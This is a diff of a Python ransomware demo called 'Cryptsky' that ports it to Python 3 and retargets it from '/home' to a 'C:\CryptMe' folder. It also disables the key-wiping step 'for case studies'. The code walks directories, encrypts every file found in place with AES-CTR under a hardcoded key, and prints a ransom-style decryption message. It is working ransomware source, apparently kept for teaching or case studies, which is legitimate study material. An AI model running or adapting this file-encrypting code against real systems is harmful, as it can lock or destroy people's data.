@@ -1,11 +1,12 @@
 #!/usr/bin/env python
-from Crypto.Cipher import AES
-from Crypto.Util import Counter
+from Cryptodome.Cipher import AES
+from Cryptodome.Util import Counter
 import argparse
 import os
-
+import random
 import discover
 import modify
+from subprocess import call
 
 # -----------------
 # GLOBAL VARIABLES
@@ -27,7 +28,7 @@ def main():
     decrypt = args['decrypt']
 
     if decrypt:
-        print '''
+        print('''
 Cryptsky!
 ---------------
 Your files have been encrypted. This is normally the part where I would
@@ -41,10 +42,9 @@ your files forever. Do not include the surrounding quotes, but do make sure
 to match case, special characters, and anything else EXACTLY!
 Happy decrypting and be more careful next time!
 
-Your decryption key is: '{}'
-
-'''.format(HARDCODED_KEY)
-        key = raw_input('Enter Your Key> ')
+Your decryption key is: %s
+''' % HARDCODED_KEY)
+        key = input('Enter Your Key> ')
 
     else:
         # In real ransomware, this part includes complicated key generation,
@@ -57,27 +57,30 @@ Your decryption key is: '{}'
         #     key = random(32)
 
     ctr = Counter.new(128)
-    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
+    crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['/home']
+    startdirs = ['C:\\CryptMe']
 
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             modify.modify_file_inplace(file, crypt.encrypt)
-            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+            # os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
+    ''' # Taken out for Case Studies
     # This wipes the key out of memory
     # to avoid recovery by third party tools
     for _ in range(100):
-        #key = random(32)
+        key = random(32)
         pass
+    '''
 
     if not decrypt:
         pass
          # post encrypt stuff
          # desktop picture
          # icon, etc
+
 
 if __name__=="__main__":
     main()
